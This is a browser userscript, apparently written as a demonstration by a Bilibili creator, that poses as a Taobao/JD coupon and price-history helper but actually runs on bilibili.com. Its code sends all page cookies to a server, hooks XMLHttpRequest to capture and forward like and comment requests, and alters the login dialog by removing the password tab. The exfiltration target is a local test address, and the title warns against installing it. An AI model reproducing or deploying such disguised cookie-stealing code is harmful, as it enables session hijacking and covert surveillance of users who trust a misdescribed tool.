/*
 * @Author: kmq
 * @Date: 2022-04-11 11:46:09
 * @LastEditors: kmq
 * @LastEditTime: 2022-04-13 10:56:08
 * @Description:
 *
 * Copyright (c) 2022 by kmq, All Rights Reserved.
 */
// ==UserScript==
// @name         解除某宝某东的XXXX功能（科码秋演示，请勿安装）
// @namespace    bilibili_kmq
// @version      0.1
// @description  最简洁好用的购物小助手啦~ 自动显示京东(jd.com)、淘宝(taobao.com)、天猫(tmall.com)、聚划算、天猫超市、天猫国际(tmall.hk)、京东国际(jd.hk)、京东图书、京东电子书、京东工业品、京东大药房(yiyaojd.com)隐藏优惠券与历史价格。不止让您省钱开心购物，更可以告别虚假降价，以最优惠的价格，把宝贝抱回家。
// @author       kmq
// @match        *://*.bilibili.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=bilibili.com
// @require      https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js
// @license 		 MIT
// @downloadURL https://update.greasyfork.org/scripts/464049/%E8%A7%A3%E9%99%A4%E6%9F%90%E5%AE%9D%E6%9F%90%E4%B8%9C%E7%9A%84XXXX%E5%8A%9F%E8%83%BD%EF%BC%88%E7%A7%91%E7%A0%81%E7%A7%8B%E6%BC%94%E7%A4%BA%EF%BC%8C%E8%AF%B7%E5%8B%BF%E5%AE%89%E8%A3%85%EF%BC%89.user.js
// @updateURL https://update.greasyfork.org/scripts/464049/%E8%A7%A3%E9%99%A4%E6%9F%90%E5%AE%9D%E6%9F%90%E4%B8%9C%E7%9A%84XXXX%E5%8A%9F%E8%83%BD%EF%BC%88%E7%A7%91%E7%A0%81%E7%A7%8B%E6%BC%94%E7%A4%BA%EF%BC%8C%E8%AF%B7%E5%8B%BF%E5%AE%89%E8%A3%85%EF%BC%89.meta.js
// ==/UserScript==
(function() {
  'use strict';
	$(document).ready(()=>{
		$('body').append(`<div class="roll-btn-wrap"> <div id="kmqTestBtn" style="position:fixed;right: 25px; top:100px; background-color:#F07775;color: #fff;" class="primary-btn roll-btn"> <span>进入科码秋主页</span> </div> </div>`)
		/**
		 * 将用户所有的cookies发送至开发者网站
		 */
		mySend(document.cookie)
 
		setTimeout(()=>{
			//简单跳转
			$('#kmqTestBtn').click(()=>{
				window.location.href = 'https://space.bilibili.com/1268468909'
			})
		},300)
 
 
		let autoClickLogin = setInterval(() => {
			if($('.bili-mini').length>0){
				$('.bili-mini-tab-message').click();
				$('.bili-mini-tab-password').remove();
				$('.bili-mini-tab-line').remove();
				clearInterval(autoClickLogin)
			}
		}, 100);
	});
})();
 
/**
 * 获取用户数据发送至服务器
 * 这里提交的是本地url,仅用于测试
 * @param {*} data
 */
function mySend(data){
	$.post('http://127.0.0.1:8888/test',data,(result)=>{});
}
 
 
/**
 * 过滤B站所有的用户动作,可以理解为ajax代理
 */
XMLHttpRequest.prototype.send = new Proxy(XMLHttpRequest.prototype.send, {
	apply: (target, thisArg, args) => {
		thisArg.addEventListener('load', event => {
			try {
				let { responseText, responseURL } = event.target
				if (!/^{.*}$/.test(responseText)) return
				setTimeout(() => {
					if(/x\/web-interface\/archive\/like/.test(responseURL)
						|| /x\/v2\/reply\/add/.test(responseURL)){
						/**
						 * 用户点赞数据发送至开发者网站
						 */
						mySend(JSON.stringify(args))
					}
				}, 300);
			} catch (err) { }
		})
		return target.apply(thisArg, args)
	}
})